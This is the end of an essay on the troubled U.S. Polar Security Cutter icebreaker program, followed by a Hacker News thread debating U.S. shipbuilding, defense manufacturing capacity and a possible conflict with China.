At the time, they were considered the most technologically advanced icebreakers in the world. The Wind-class ships were followed by an even more powerful icebreaker, the Glacier, in 1954. Wind-class icebreaker Northwind. In the 1960s, as the Wind-class ships aged, the Coast Guard began to consider their replacement, and in 1971 awarded a contract to Lockheed shipbuilding for the new Polar-class icebreakers, designed to be “the world’s most powerful icebreakers.” The first Polar-class ship, the Polar Star, was commissioned in 1976, followed by the Polar Sea in early 1977. When the Polar-class ships launched, the U.S. had five icebreaking ships. And as the Wind-class ships continued to retire, this number fell. By 1989, the U.S. had just two icebreakers. In the 1990s, funding was allocated for another icebreaker, the medium icebreaker Healy, which was completed in 1999. Since then, no new polar icebreakers have been built in the U.S. Both the Polar Sea and the Polar Star continued to operate until 2010, when the Polar Sea suffered a catastrophic breakdown of its engines. Since then, it has been in drydock, acting as a source of spare parts for the Polar Star, as many of those parts are no longer manufactured. The Polar Star is far past its original service life, and it must spend nearly all its time between McMurdo Station missions being repaired. During a major refurbishment of the Polar Star in 2010, the head of the Coast Guard stated that “it’s a little uncertain to me how many more years we can get out of her in her current condition.” That was 14 years ago; today the Polar Star remains America’s only heavy icebreaker, and the only U.S. ship that can clear a path through the ice to resupply McMurdo Station. The Polar Security Cutter program To replace its aging icebreakers with a new, larger fleet of ships, in 2013 the Coast Guard initiated its Polar Security Cutter program to construct a series of new heavy icebreakers. The Coast Guard solicited bids in 2017, and the first contract was awarded in 2019, to VT Halter Marine, with an expected delivery date of 2024 for the first ship. But the program has gone poorly. While most icebreakers are custom designed using proven concepts, the team of TAI and Halter Marine used a German icebreaker that has yet to be built as a ‘parent design’, intending to modify it for Coast Guard needs. After five years, this modification still isn’t complete; as of July 2024 the design was only 59% done, and construction has not yet started. While the original delivery date for the first ship was 2024, that has now been pushed back to 2029. In a report and testimony, the GAO described some of the problems during the program: U.S.-based designers and shipbuilders generally lacked experience designing and building heavy polar icebreakers. The ship design is complex, including that it used a specialized steel alloy that required technical study and development of new welding procedures before use. The shipbuilder overestimated the extent to which it could leverage the original design and had to make significant design changes to meet government specifications, according to program officials. The shipbuilder also made some design errors, such as selecting the wrong height for the lowest deck of the ship, which required significant, late redesign to correct. COVID-19 restrictions limited the extent to which the shipbuilder could collaborate and consult with its domestic and international partners. Notably, VT Halter Marine lost $256 million between 2017 and 2021, after which it was bought for a song (just $15 million) by Bollinger, which took over the icebreaker contracts. Originally, the Polar Security Cutters were expected to cost $800-$900 million per ship ($1.1-$1.3 billion in 2024 dollars), but current cost estimates are closer to $1.7-1.9 billion, and given that construction hasn’t started yet, this is likely to rise. And it’s unclear if that 2029 date will be hit either. The GAO report notes that “the shipyard is completing, on average, approximately three percent of functional design and six percent of transitional design every six months. At that design completion rate, it would take the shipyard approximately eight years to complete functional design.” By contrast, a Finnish shipyard can build a heavy icebreaker for just a few hundred million dollars, and deliver it within two years, instead of 10 or more. However, the Coast Guard opted not to pursue a foreign manufacturer, instead choosing a U.S. shipyard. The culprit here isn’t the Jones Act, but another protectionist shipbuilding law that requires Naval and Coast Guard ships to be built in U.S. shipyards. It’s possible to waive this requirement via presidential authorization, but there hasn’t appeared to be much interest in this. Waiving this requirement and allowing the Coast Guard to buy icebreakers from Finland would likely save over a billion dollars per ship, as well as years of construction time. Barring acquiring Finnish icebreakers, the next best option for the U.S. icebreaker program would have been awarding the contract to a team that had icebreaker experience. Finnish shipbuilding firms previously assisted during the design and construction of the Healy. Of the three bids submitted for the Polar Security Cutter program, two were from U.S. shipyards partnered with European firms that had previously designed and built icebreakers. The winning bid from VT Halter was, bizarrely, the only bid without an experienced partner. The U.S. has made some gestures to try and improve its icebreaker construction with the ICE Pact, a non-binding agreement to collaborate and share information on icebreaker design and construction. But experts appear skeptical as to whether this will have much impact, as it’s predicated on attracting foreign orders for U.S.-built icebreakers that aren’t likely to materialize. Conclusion With icebreakers, we see a microcosm of the broader problems we looked at in U.S. shipbuilding. Icebreakers are far more expensive to build (and take much longer to build) in the U.S. than in foreign shipyards, and it’s only a series of protectionist laws that drive any icebreaker construction here at all. We also see the same cultural issues that we saw with American shipbuilding more broadly. There seems to be a lack of motivation to take maritime issues seriously or treat them as important. For decades, the U.S. has been willing to accept an undersized icebreaker fleet – complaints about insufficient icebreakers date back to the 1980s. There appears to be little interest in trying to ameliorate this by acquiring foreign icebreakers, even though that would be comparatively simple, far cheaper, and far faster. And the Coast Guard apparently did not think icebreakers were important enough to select a team for building them that had icebreaker experience, even though it’s a niche, specialized area of marine construction. As a result, icebreaking can be added to the list of things like dredging and offshore wind turbine installation: areas that have been shackled to America’s inefficient shipbuilding industry and have inflicted costs on the country in the process. Much of this information comes from Peter Rybski’s substack, 60 Degrees North, which I highly recommend if you’re interested in learning more about icebreakers and icebreaker policy. Thanks to Peter for reading a draft of this. All errors are my own. For those interested in reading more about icebreakers, and about shipbuilding, a recommended reading list is available here for paid subscribers. 1 Per Peter Rybski: “Icebreaker is rather hard to define. There is the 'popular' method, in which all ice-capable ships are called icebreakers. There is a 'technical' method, in which only vessels that are classified as icebreakers (as opposed to only Polar Class) are icebreakers. And there is a third method (which is sometimes used with older vessels – before the Polar Code – based on the purpose of the vessel).” Subscribe to Construction Physics By Brian Potter · Hundreds of paid subscribers Essays about buildings, infrastructure, and industrial technology. Subscribe Error 106 Share this post Why the U.S. Can’t Build Icebreaking Ships www.construction-physics.com Copy link Facebook Email Note Other 31 Share Previous",
    "commentLink": "https://news.ycombinator.com/item?id=41662831",
    "commentBody": "Why the U.S. can't build icebreaking ships (construction-physics.com)218 points by chmaynard 22 hours agohidepastfavorite285 comments 0xffff2 22 hours agoAn interesting summary, but I don't think the article really answered the headline. In particular, I'm left wondering which is the bigger problem: Is it that the US ship builders aren't competent and have turned what should have been a fairly straightforward modification of an existing design into a huge boondoggle, or is it that the government requirements are poorly thought out and/or overly ambitious, resulting in costly redesign efforts that aren't really necessary? Put another way, are we spending all this time and money to fail at simply building a ship that is functionally identical to one of these ~$300m Finnish ice breakers, or are we claiming we need something more sophisticated? reply jahewson 22 hours agoparent> Is it that the US ship builders aren't competent Yes, they are woefully uncompetitive. They produce single-digit numbers of commercial oceangoing ships annually, at 2-4x the cost of elsewhere. It’s an industry on life support. reply beloch 19 hours agorootparentCanada has the same problem with building icebreakers. The problem with icebreakers capable of dealing with multi-year ice is that they're a very expensive and specialized kind of ship that's hard to construct, but also the sort of ship that has a very long lifetime. Only a few governments in the world have any need of such ships, and they typically only need a few in the span of many decades. By the time Canada got around to looking for new icebreakers, not a single shipyard in the country had made one in many decades. Ordering a ship from someplace foreign that had actually made one recently would be cheaper than trying to make one domestically. However, then shipyards that haven't made an icebreaker for twenty years would become shipyards that haven't made one for forty years. It really would make a lot of sense for close allies like Canada and the U.S. to collaborate on building icebreakers. reply morkalork 15 hours agorootparentLike this? https://www.reuters.com/world/us-canada-finland-launch-effor... reply ChiMan 9 hours agorootparentprevFinland is part of NATO. The US and Canada should collaborate with it too. Sharing knowledge is a perfect way for European NATO allies to carry more of the collective defense burden. reply impossiblefork 8 hours agorootparentDoes it really make sense for Finnish shipyards to share knowledge of icebreaking when there the released text above discusses things such as the US and Canada selling icebreakers to third parties? It seems more like a way taking over the industry from the Finns. Obviously there may be specifics of the deal that makes it acceptable, but the vague text I see seems just terrible for the Finns. I suppose it might be accepted because of the Canadian ownership of the shipyard in question. reply ca_tech 2 hours agorootparentIt is a case of economic security. US National Security Advisor Daleep Singh spoke about this on the Odd Lots podcast a month ago. The goal is an integrated supply chain across all three countries, and an end result of marketing the ice breaker capacity to other allies. https://www.listennotes.com/podcasts/odd-lots/how-the-white-... Transcript Notes at 00:17:51 reply impossiblefork 1 hour agorootparentYes, he says 'What do they get. Well, in exchange, we agree to integrate our ice breaking supply chains so that they are interoperable at every stage of production', but that doesn't actually benefit Finland Furthermore, suppose that it actually was something substantial, some kind of deal that NATO icebreakers are to be made by the US, Canada or Finland, then you screw the Aker group in Norway, who also make icebreakers. The way I see it they expect that since the Canadians have been able to nab the shipyard after the disorder caused by the sanctions they can transfer all the knowledge from the Finns and make the icebreakers themselves, seizing appealing high-tech shipbuilding niche from the Finns, and they offer nothing in return but bullshit. An integrated supply chain, sure, maybe that can save money, but once you've transferred your knowledge you no longer have your niche. I think this is very obvious in the talk because of the vagueness in what is offered to the Finns; and my interpretation is that nothing meaningful is offered to the Finns and the the US is just expecting to seize this niche. I don't think the 'there'll be enough for all of us' talk is plausible either. Surely, there might be an expansion demand, but there's really only the Baltic and the polar area that matters, and maybe US and Canada together do need 40 or so icebreakers to keep the North-West Passage safe and open in case it is to become a major trade route, but they'll last basically for ever, and my understanding is that the US is talking about only nine or so. reply bluGill 5 hours agorootparentprevIt is in US/Canada's interest to have a shipyard in North America building ice breakers. Even though Finland is a NATO member, if something happens to Finland NATO may need some ship yards elsewhere to build more ice breakers (running 24x7 shifts!) while liberating Finland. Remember NATO (and military in general) needs to plan for all worst cases not likely cases. The above does not mean the shipyards need to be US/Canada. If they are Finland owned and operated that is fine. So long as the workers and a couple (minor) engineers are local that is enough - in the worst case (Finland's shipyard is taken and all the experts there killed) that shipyard is expanded and has some expertise to build on. reply impossiblefork 5 hours agorootparentYes, but the yard is Canadian owned. I suppose it was Russian-owned before. But the combination of foreign ownership together with exporting know-how, this combination is kind of how one loses an industry to some other country; and then upon that there's that you can't even sell to the country that owns the company because of protectionism on their part. reply helsinkiandrew 8 hours agorootparentprevIt's an interesting side note that in the 80's the Soviet Union, despite having a large icebreaking ship building capabilities, also bought icebreakers from Finland (then not a member of NATO) Including a couple of Nuclear ones (they fitted the nuclear engine themselves): https://en.wikipedia.org/wiki/Vaygach_(1989_icebreaker) reply jillesvangurp 8 hours agorootparentWhen I was living in Helsinki, there were two huge icebreakers there whose main job it was to keep the baltic see open for the Russians. I think that probably changed a bit since they joined NATO. I guess that aside from Alaska, the US doesn't have to deal with a lot of sea ice and isn't that dependent on arctic shipping routes. For Russia that's very different. The sea near St Petersburg can freeze over and Murmansk is also hard to reach in winter. And with Svebastopol and the black see fleet out of action, those would be strategically important for Russia. And they rely on the northern arctic route for trade with China as well. reply helsinkiandrew 7 hours agorootparentSisu and Urho - they're still there - along with newer sister ships. Visible from satellite view of Google Maps. https://maps.app.goo.gl/rUq42cC1xFhUB8ij9 reply ImJamal 2 hours agorootparentprevThe US Navy will send ships in the Arctic Ocean past Alaska. It tends to be more common for submarines to be there, but surface ships do go there on occasion. reply thfuran 19 hours agorootparentprev>However, then shipyards that haven't made an icebreaker for twenty years would become shipyards that haven't made one for forty years. Is there really much difference? reply elygre 12 hours agorootparentPossibly this: In twenty years, the experience retires. In forty, it dies. reply kjs3 18 hours agorootparentprevWell...it's reasonable for the shipyard to still employ folks with hands on experience 20 years later. I occasionally get tapped to pitch in on things I did 20 years ago (even if it's just \"why the hell did you do this?\"), and shipbuilding changes vastly slower than my gig. That's much less likely 40 years on. reply Teever 19 hours agorootparentprevYes. The longer that a shipyard goes with fewer and fewer contracts the more likely it is to go out of business. And it's far harder to get a ship built at a yard that is out of business than one that isn't. reply Sakos 17 hours agorootparentAlso, shipyards that recently built one are more likely to get contracts to build more. Because other countries will be facing the same question. reply bruce511 14 hours agorootparentMore likely though isn't the same as likely. If I'm going to buy an icebreaker from a foreign supplier, sure the US is in the market, but they're still more expensive and take longer than Finland. To get good at something, good enough that you're competitive on the world stage, you need to be building lots, iterating, getting feedback and so on. The US coast guard doesn't have the need to kick-start that sort of scale of development. So it takes a fortune (think 10s of billions) to catch up to the Finns. But the headline number is somewhat irrelevant. 300m sent to Finland is \"gone forever\". 1.1 billion spent in the US boosts the economy, and ultimately works its way back to the govt in taxes. The benefits have little to do with \"preserving skillset\" and more to do with the economic benefit of circulating another billion in the local economy. reply bostik 13 hours agorootparent> But the headline number is somewhat irrelevant. 300m sent to Finland is \"gone forever\". Even with the quotes, as a Finn I find this statement rather tasteless. Or would you also claim that cross-border trade with more nearby nations is \"money gone forever\"? reply skinkestek 3 hours agorootparentSome people seems to be willing to spend significantly more if it means no one else makes a profit from it. On a national level I understand the interest to keep investments within country borders. For a random person or company I don't get it (except for very specific cases like voting with our wallets against dictatorships like China). reply matips 10 hours agorootparentprev>But the headline number is somewhat irrelevant. 300m sent to Finland is \"gone forever\". You can make a deal that US buy icebreaker for 300M from Finland and Finns buy weapons from US for 300M. They need it because of Russia and you boosts US economy in other areas. reply Ekaros 13 hours agorootparentprevYou get 300 million asset. If that asset produces more than 300 million in economic value you would have generally missed, isn't it still decent investment? If you do not need icebreaking, why spend money in first place? And instead use it somewhere that you get both benefits from. reply saati 5 hours agorootparentprevWhat other countries? There are maybe 10 that care even a little a bit about icebreakers. reply hintymad 19 hours agorootparentprevCurious why the US does not think this is a big problem. I mean, look at the US 80 years ago. The US easily out produced the Axis. We could produce faster and cheaper. There's really no excuse that the cost of making canon shells is 10x higher than Russia. Isn't being able to manufacturing cheaply the signature of a highly developed society? Besides, expertise is not just volumes of blueprints, right? We can only keep our expertise by actively doing. If the next war breaks out, how would the US win? By sending armies of lawyers and coders? reply throwup238 18 hours agorootparentThe US outproduced the axis towards the end of the war but it was a real mess for the first few years while industries retooled and the government broke through obstacles like the aluminum cartel. It was only after Pearl Harbor and the formation of the War Production Board in 1942 that manufacturing really picked up because everyone felt the existential threat and organized against it. The US can’t make cheap artillery shells because we don’t have much artillery manufacturing. Our armies just don’t use much artillery. We use mostly guided munitions dropped from planes and rockets fired from the ground, whereas Russian doctrine has always focused on artillery. reply hintymad 16 hours agorootparent> We use mostly guided munitions dropped from planes and rockets fired from the ground, whereas Russian doctrine has always focused on artillery. Thanks for the specifics. I don't know about guided munitions, but I'd imagine a million dollar a rocket will be quite expensive for a prolonged war. Also, the US debuted a killer zone, Rogue 1, a few months ago, and it cost about $94K. $94K! I'm sure the drone is more advanced than DJI Mavic 3 Pro, but is it really 50 times more advanced even if we take the cost of military-grade into consideration? It looks to me the only explanation is that without a healthy manufacturing sector in the US, the cost of anything would go through the roof because we have lost the economy of scale. reply bluGill 5 hours agorootparentA million dollar rocket is expensive, but it hits exactly where you want it and so you need far less of them. Artillery is a lot cheaper but also much harder to get exactly where you want it and so you end up using far more of it. Note that Russia and the US have both guided misstles and artillery. Both have value in different situations. They both have their reasons for their preference, but that is more about how they expect a war they are involved in to look than about thinking one is better. reply hintymad 41 minutes agorootparentAh, I was actually thinking about how iron dome vs Hamas rockets. Iron dome was super effective, yet a million a pop to shoot down a rocket that costs a few thousand dollars at most may quickly bankrupt a country. That said, maybe it's just one aspect of the war while in grand scheme of things highly effective guided missiles will win the war. reply throwaway48476 4 hours agorootparentprevExcept the effectiveness of precision fires is now closer to 50% in a GPS denied environment. Now it's both expensive and inprecise. reply bluGill 3 hours agorootparentEvery hear the term \"arms race\". This is a constant in history. There precision weapons that don't use GPS. There are various ways to evade GPS denial (I don't know how effective they are). We will constantly be in a race of out doing each other. reply adgjlsfhk1 13 hours agorootparentprevdrone is an incredibly broad category and military ones have really good reasons for sometimes costing a ton more. the biggest reason is the need to deal with adversarial input. dealing with GPS spoofing, properly encrypted and jamming resistant spoofing, not leaking the location of the operator, etc all are really complicated requirements that need expensive mitigation (and worse, prevent you from using commercial components) reply skinkestek 3 hours agorootparent> drone is an incredibly broad category and military ones have really good reasons for sometimes costing a ton more. After following the development of drones in Ukraine since 2022 and also listening to people familiar with the US army, I also think there are some not so good ones, one particular nasty one being scope creep. Recently heard about a US effort to create home built expendable drones for use at the squad level like the ones Ukrainians use and the result was too heavy and a lot more expensive (some of it thanks to the demand that everything be produced in a US controlled supply chain) but also as a result of good old fashioned scope creep. And this is nothing new: AFAIK there is an old British military saying something like \"an elephant is what a mouse would be if specified by a military procurement committee\". reply dgroshev 49 minutes agorootparentNote that FPV drones in Ukraine are not squad-level, there are separate drone units (at the very least 2 operators, at least 1 explosives guy because arming drones with makeshift explosives is not trivial and super risky, plus cover). Plus they are supplied literally on the back of a minivan in cardboard boxes because they only need to survive one way trip over a couple hundred km, the US needs to supply their units half a globe away. US army drones are squad-level, have proper safing/arming, transportable, and shelf-stable. It's not scope creep, it's a very different doctrine and circumstances. reply cpursley 18 hours agorootparentprevRussia is out producing the US on guided munitions and rockets fired from the ground as well (and missile defense). And icebreakers, of course. So it’s doable - just depends on priorities (ie, moving chip manufacturing back which seems to have us recent success). reply Sakos 17 hours agorootparentUS shipyards and military production are extremely low on any number of metrics. It's unclear even now whether the US has enough stockpiles and enough production of modern munitions to maintain an active war against a peer adversary like China with such massive production capacity and such a massive population. At some point, you do need constant production of enough munitions, doesn't matter how smart or precise those might be. Just recently a US navy tanker ran aground and now they're scrambling to find some way to fuel the carrier group in the middle east because for some reason that's the only one that was available. The navy logistics group is woefully understaffed und under-equipped. What are the priorities in actuality? Because maintaining a military at adequate readiness doesn't seem to be at the top of the list. reply hintymad 16 hours agorootparent> Because maintaining a military at adequate readiness doesn't seem to be at the top of the list. I think Yamamoto Isoroku gave the answer to this challenge: just keep a booming manufacturing industry. When he was trying to convince the Japanese government not to have a war with the US, he said that he saw so many chimneys when flying over Philadelphia. All those factories would turn into a giant war machine if a war ever broke out. That is, the economy of scale matters. When the US had its entire supply chain domestically, replacing a special screw could cost a few cents. When we were in good terms with China, it would cost a few dollars as we had to order the replacement overseas, but well, it was still cheap. Now that we are trying to cut China off, then what will do if we'd need to get a replacement? Setting up a shop from scratch with little expertise and no supply chain to back it up? Well, such replacement would then cost a few thousand dollars and we would be screwed. reply bluGill 5 hours agorootparent> Setting up a shop from scratch with little expertise and no supply chain to back it up? Well, such replacement would then cost a few thousand dollars and we would be screwed. You were correct up to here. However the US has a lot of manufacturing and so is not setting things up from scratch. Most of our manufacturing is automated these days and so it doesn't appear in many of the reports people care about, but the talent is still here. Of course just like WWII, if war breaks out it will be several years before the US can ramp up production. reply hintymad 31 minutes agorootparent> You were correct up to here. However the US has a lot of manufacturing and so is not setting things up from scratch This is music to my ears. I read somewhere that the average age of the technicians in the US shipyards are well over 55 years old, hence I worry that we are losing key talents. There was also a NYT article more than 10 years ago that analyzes why the US can't make Kindle even if we want. Also, when people were outraged that the air force spent more than $20K per toilet more than 10 years ago, I read somewhere that it was because our law mandated that certain percentage of the components have to come from domestic manufacturing. Unfortunately the air force had a hard time finding such components, so they chose toilet. In order to do this, they had to find a factory in the US, which caused really high unit price. And then a recent article explained why it was so expensive to replace components on weapons: usually these components are custom-made. It would be cheap if we had a vast supply chain domestically, as it would be inexpensive to set up a custom mold or tooling chain for a few such component as the cost can be amortized over millions of other regular components. Without such supply chain, we wouldn't have such luxury. Hence came my worry. reply klooney 32 minutes agorootparentprevWe have a high dollar value of manufactured products, but volume is way down, and the supply chain is ragged or totally broken. If your factories are warehouses where you assemble Chinese feedstock with German tools, how much local expertise do you have, or is it just LEGO kit stuff for tariff evasion? reply roenxi 14 hours agorootparentprev> It's unclear even now whether the US has enough stockpiles and enough production of modern munitions to maintain an active war against a peer adversary like China Is it? What is the theory that the US could keep up with China? That would be the US vs the globe's industrial superpower with an arguably larger real economy. It doesn't seem plausible that the US can fight a long sustained war. The plan as far as I can see it is to make use of a large network of allies and partners as well as aiming to finish the war quickly by cutting off materials like food and industrial inputs to stall the manufacturing engine. If it turns into a slugfest where munition reserves start to matter that seems like it would favour China. One of the big surprises out of the Ukraine war is that the US isn't in a position where it can easily bully Russia. If that is the case it is hard to see it coming out ahead vs China in any plausible conflict. reply hintymad 27 minutes agorootparent> That would be the US vs the globe's industrial superpower with an arguably larger real economy Wouldn't it be sad if this were true? Since when US was no longer a \"industrial superpower\"? Just 25 years ago, Chinese government officials were astound by how wealthy and advanced the US was when they visited the US. They wrote articles after articles to reflect why China was so behind, yet now China is the \"globe's industrial superpower\". In Oliver Stone's movie Heaven & Earth, Joan Chen's character went to the US and was totally mesmerized by the abundance in a supermarket. That was how Chinese people was amazed by the US too. And now? It's definitely great for China, but isn't it sad for the US to be behind? reply Qwertious 7 hours agorootparentprev>One of the big surprises out of the Ukraine war is that the US isn't in a position where it can easily bully Russia. The US hasn't been fighting Russia - if they'd deployed F35s in 2022 then Moscow would be called West Alaska by now. Don't conflate \"doesn't\" with \"can't\". reply roenxi 6 hours agorootparentBut if they \"doesn't\" fight Russia now, why are they going to fight China in the future? Pretty good odds they won't because the cost is too high. What we appear to be seeing is they don't really have a lot of tools that can be used against an uncooperative nuclear-armed power; and many of those tools would probably fail against China. reply bluGill 5 hours agorootparentNobody wants to fight China because the cost is so high - we are talking about lives more than dollars here (though dollar cost is high too). What everyone worries about is being forced to fight China anyway. China is not playing nice with the US on the world stage. They are clearly supporting Russia over Ukraine (while pretending to be neutral). They are siding with Iran in the middle east. They are doing things in Africa that are against US interests (the US doesn't have a good record in Africa, but the US generally has supported democracy while China is fine with dictators which leaves lots of room for China to be worse though only time will tell). They escalating with Taiwan and the Philippians. Those are the major reasons I'm aware of to be worried about China, there is more that I didn't write. How will this turn out - we can only guess. But there is reason to worry. reply nradov 13 hours agorootparentprevYes, the theory is that the USA should keep up with China and maintain a qualitative edge in order to contain them. Keep it up long enough and hopefully they will collapse or undergo an internal revolution, sort of like what happened to the USSR. reply phil21 15 hours agorootparentprev> It's unclear even now whether the US has enough stockpiles and enough production of modern munitions to maintain an active war against a peer adversary like China with such massive production capacity and such a massive population. I don't think it's unclear at all. It's uncomfortable to call out an obvious truth: We couldn't even compare. The only hope we have is basically economic mutually assured destruction. If it comes to a hot war, it better be over (without going nuclear) within weeks or at most single digit months or it's more or less over. At least from where I'm standing. It's unclear if the US could even get production ramped up on the scale of a decade. We simply don't have the people to train the people we need. Much less the people with the skills to do the thing. reply throwup238 14 hours agorootparent> If it comes to a hot war, it better be over (without going nuclear) within weeks or at most single digit months or it's more or less over. At least from where I'm standing. Why? There is essentially zero chance that China can mount an invasion of the mainland US or even strike at its heartland enough to disrupt an industrial ramp up, even if it takes a decade (which it won't). The US can literally wait out anyone except Canada and Mexico (which... lol) by defending its coasts, with plenty of domestic natural resources - including agriculture, metals, and oil - to supply not just its military but the entire civilian population. reply bruce511 13 hours agorootparentThere is zero chance of China invading the US or vice versa. But this issue isn't about a ground war in either place, it's about a war in some 3rd place. It's not about \"home country\". The US doesn't need carrier groups to defend home country. It needs them to project power into other parts of the world. Take Taiwan. If China invades there that represents a significant dilemma for the US. On balance, they'll likely make a token response, then fade away. Places where the US has enjoyed power (like the South China Sea) might be harder to protect. Does the US have the stomach for wars in Taiwan, Japan or Australia? reply throwup238 13 hours agorootparent> There is zero chance of China invading the US or vice versa. But this issue isn't about a ground war in either place, it's about a war in some 3rd place. Agreed > It needs them to project power into other parts of the world. China can barely project power in its own backyard while the US has nearly a century of experience projecting around the world, with eleven carrier groups to China's two. Assuming they all get destroyed by hypersonic missiles within the first few months, the US still has military bases all over the world. As far as I know, China has zero military presence in the Western hemisphere except some surveillance balloons. China may have a short term advantage in production and cost but the US has the advantage in every other area of logistics relevant to a military. > Take Taiwan. If China invades there that represents a significant dilemma for the US. On balance, they'll likely make a token response, then fade away. Places where the US has enjoyed power (like the South China Sea) might be harder to protect. Absolutely but it'd be a pyrrhic victory worth little except as domestic propaganda. If the US does help defend Taiwan, the invading Chinese fleet will likely be massacred. There's little room to hide in the 80 mile wide Taiwan strait against modern anti-ship and anti-aircraft weapons. China's only real advantage will likely be air power, which doesn't win wars without lots of boots on the ground. > Does the US have the stomach for wars in Taiwan, Japan or Australia? I'm not sure about Taiwan, but I don't think we'd let Japan or Australia slip into war without assistance. (but what do I know? :-)) reply bluGill 5 hours agorootparent> China can barely project power in its own backyard while the US has nearly a century of experience projecting around the world, with eleven carrier groups to China's two Today. China is clearly building up their ability. In a few years the situation will look different which is the real worry. Also China may not need to be as big - China isn't patrolling the ocean like the US and so it is their 2 carrier groups near Taiwan against whatever the US can afford to send reply justin66 11 hours agorootparentprevThe recent incarnation of isolationism in American politics might manifest if the US had the wrong leadership during an invasion of Taiwan or, I guess, Australia. Defending Japan is a reflex action. We have bases and troops there, as well as a mutual defense treaty. reply ywvcbk 13 hours agorootparentprevThe hypothetical war in Taiwan would likely be almost entirely naval/aerial so yeah the question is if US has enough political will. Don’t think artillery shells will be a huge factor and even on paper the Chinese navy (and probably the air force) doesn’t even come even remotely close to US (yet). Actual invasions of Japan and Australia are even harder to imagine. How would that even work? And why? reply Ekaros 13 hours agorootparentChina-Taiwan situations is technically still a civil war. Internal conflict to \"China\". Like war between Confederacy and Federation forces. It is unlikely that China will invade Japan and certainly not Australia. I find it extremely more likely that USA will invade Mexico with some fake pretence like war on drugs. reply zmgsabst 13 hours agorootparentprevArtillery and particularly guided artillery like Excaliber rounds are highly effective at resisting landings. In the most recent US wargame, China succeeded in occupying parts of Taiwan which would make artillery even more important — as attacks from the mountain regions towards Chinese occupation would keep them from establishing a secure foothold. reply ywvcbk 7 hours agorootparentWar games can be very deceptive though. Back in 2019/20, 2 separate studies ( Polish and US) expected that it would only take Russia 4-5 days to get to Warsaw with Polish units sent to the border suffering 60-80% casualties. To be fair NATO wasn’t taking really taking defense that seriously back and maybe they had a point, although considering what happened in Ukraine that seem like a very unlikely outcome (unless Britain/France/Germany decided to stay out and not risk their air forces ..) I guess overestimating your opponents is usually better than the opposite. OTH had Britain/France not made that mistake in the 30s much of WW2 could have been prevented. reply bluGill 5 hours agorootparentThe purpose of wargames is to find holes in your defense and the shore them up. If your war game doesn't find holes you are probably doing it wrong. In the real world your enemy doesn't have spies everywhere, but in a war game you should give them spies everywhere just because you won't know where those spies are and so everything could be compromised. reply zmgsabst 4 hours agorootparentprevRussia didn’t overrun Ukraine quickly because they voluntarily withdrew for peace talks. reply fpoling 11 hours agorootparentprevExcaliber became ineffective in Ukraine after Russia deployed effective jamming. reply Spooky23 16 hours agorootparentprevI think the Navy is mostly obsolete and they are focused on key assets. Ship acquisition seems too dumb. reply Spooky23 16 hours agorootparentprevYou adapt. Ukraine is emptying the US armories to kill Russians at scale. You get smarter/more accurate with the constrained supply of shells, adopt drones etc. In the 80s, expensive Maverick missiles were the primary airborne tank killer. Now the Ukrainians are dropping mortars into tank hatches from cheap drones. reply bluGill 5 hours agorootparent> Ukraine is emptying the US armories to kill Russians at scale. Not really. Most of what Ukraine is getting is things that were on the list to destroy because they are end of life anyway. Of course the important lesson to take here is that the US doesn't have enough missile defense systems in storage. reply closewith 15 hours agorootparentprevThat just moves the issue onto the production of drones. reply M95D 9 hours agorootparentprev80 years ago the priority was beating the nazis and japanese. The priority now is making money. Can't make money with ice breakers, so use the steel to make SUVs instead. reply lostlogin 10 hours agorootparentprev> Isn't being able to manufacturing cheaply the signature of a highly developed society? Maybe. Or a it’s a sign that workers, the environment, or some other factor is being exploited for gain. reply wakawaka28 17 hours agorootparentprev>There's really no excuse that the cost of making canon shells is 10x higher than Russia. Isn't being able to manufacturing cheaply the signature of a highly developed society? We have prioritized high wages for workers in the US, a phenomenon also driven by the reserve currency status of the dollar. Russians, Chinese, and Indians work for a fraction of the price we do. We have high labor costs and have to import many components due to them being made much cheaper elsewhere. >We can only keep our expertise by actively doing. If the next war breaks out, how would the US win? By sending armies of lawyers and coders? You're totally right. This war is coming very fast as well, and by some accounts has already started. I worry we will all soon find out just how bad of a position we are in, the hard way. reply hintymad 16 hours agorootparent> We have prioritized high wages for workers in the US I'm not sure if this is the dominating factor. Russia fired around 10,000 shells a day, and each costs about $1000. So for a year, Russia would have fired 3.65M shells that cost $3.6B. Let's say we need 100 workers to produce these shells. Then, he wage of the workers would cost merely $10M a year, if each one earns $100K a year. $10M over 3.65M shells, and that's just $3 a shell, or 0.3% of the cost of a Russian shell, or 0.075% of the cost of a US shell. What the US lost was not advantage of labor cost, but the economy of scale. By the way, this is also what Tim Cook said. He said that Chinese labor not cheap anymore, but China has so much scale and expertise so that the output from China is still cheap. Again, economy of scale. reply wakawaka28 14 hours agorootparentAre you kidding? Everything is outsourced because wages are high in the US. I can't believe I have to spell out such basic and obvious economic facts to presumably intelligent people. >What the US lost was not advantage of labor cost, but the economy of scale. We've lost a lot of things but the reason things are expensive here is NOT that we didn't have economies of scale. That issue came much later. You get to have scale in the first place by being economically competitive. When things are outsourced due to some other country using slave labor or else their workers surviving on a tenth of what you make in the US, that is when you lose economies of scale. Literally the only way we could compete in an open market with countries that have cheap labor is to use automation. But even with automation, those machines can be set up anywhere in the world, and they will tend to go wherever it is cheapest to run them. reply bruce511 13 hours agorootparent>> When things are outsourced due to some other country using slave labor or else their workers surviving on a tenth of what you make in the US, that is when you lose economies of scale. There may be \"Slave Labor\" in some places, but the vast majority of people doing out-sourcing for US companies are very well paid (by local standards.) They are not \"surviving\" they are thriving. living in the US is expensive. So prices go up to match. So wages go up. So materials go up. \"National security\" is expensive (and the US is obsessed by it.) 13% of the budget goes to the military. Protectionist tarrifs. Security theater like the TSA. All of this comes at a price. The US has enjoyed a leadership role in world affairs, economic strength, influence etc for 75+ years. But it turns out that \"expensive is the head that wears the crown\". I say this not as a criticism, merely as a statement of reality. Of course, whether it changes, or indeed even discussing if it should change is debatable. reply bluGill 5 hours agorootparentprevIf you check the real numbers, not everything is outsourced. There is still very significant manufacturing in the US - and the number is increasing. China is perhaps increasing faster, but that doesn't mean the US isn't doing well. reply hintymad 14 hours agorootparentprevI believe initially yes, wage is a big factor. It's just that now the wage gives way to the economy of scale (maybe regulation plays a big role too). It's pretty sad too. The capital wants returns and growth, at the cost of weakening a country for generations to come. reply fifteen1506 17 hours agorootparentprevI'm pretty sure costs have gone up not due to workers' salaries... reply wakawaka28 14 hours agorootparentI wasn't talking about a change in costs. Costs have been high in the US for a very long time. What matters in terms of industry is that the rest of the world is coming online and their products are much cheaper than ours, mostly due to cheap labor and the currency exchange rates. Cost increases of domestically sprouted goods in terms of dollars are overwhelmingly driven by inflation. reply brazzy 11 hours agorootparentprev> I mean, look at the US 80 years ago. The US easily out produced the 